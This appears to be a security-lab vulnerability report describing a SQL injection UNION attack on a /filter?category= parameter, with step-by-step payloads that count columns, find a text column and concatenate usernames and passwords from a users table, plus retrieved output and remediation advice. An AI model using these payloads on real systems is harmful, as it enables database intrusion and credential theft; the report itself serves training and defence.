# Vulnerability Report — SQL Injection UNION Attack, Retrieving Multiple Values in Single Column

## 1. Vulnerability Overview
- **Name:** SQL Injection UNION Attack with Concatenation
- **Severity:** Critical
- **Location:** /filter?category=
- **Tool Used:** Burp Suite Repeater

## 2. Description
When only one column is compatible with string data,
an attacker can use concatenation to combine multiple
values into a single column. By concatenating username
and password with a separator, both values are returned
through one text-compatible column.

## 3. Steps to Reproduce
1. Determine column count:
   ' ORDER BY 2-- ✅ → 2 columns
2. Find text-compatible column:
   ' UNION SELECT NULL,'test'-- ✅ → column 2
3. Concatenate username and password:
   ' UNION SELECT NULL,username||'~'||password FROM users--
4. Output: administrator~s3cure ✅

## 4. Evidence
 <img width="535" height="730" alt="Screenshot 2026-08-19 001914" src="https://github.com/user-attachments/assets/894e0d42-84cd-4081-8e99-f229c3ebdab4" />
<img width="1912" height="1015" alt="Screenshot 2026-08-19 002639" src="https://github.com/user-attachments/assets/9b9851f8-4732-4dda-89b9-760316292847" />


## 5. Impact
Even when limited to one visible column, an attacker
can still extract multiple sensitive values by
concatenating them, leading to full credential
exposure and account takeover.

## 6. Remediation
- Use parameterized queries (Prepared Statements)
- Never concatenate user input into SQL queries
- Implement input validation and WAF rules
- Use an ORM (Object Relational Mapper)
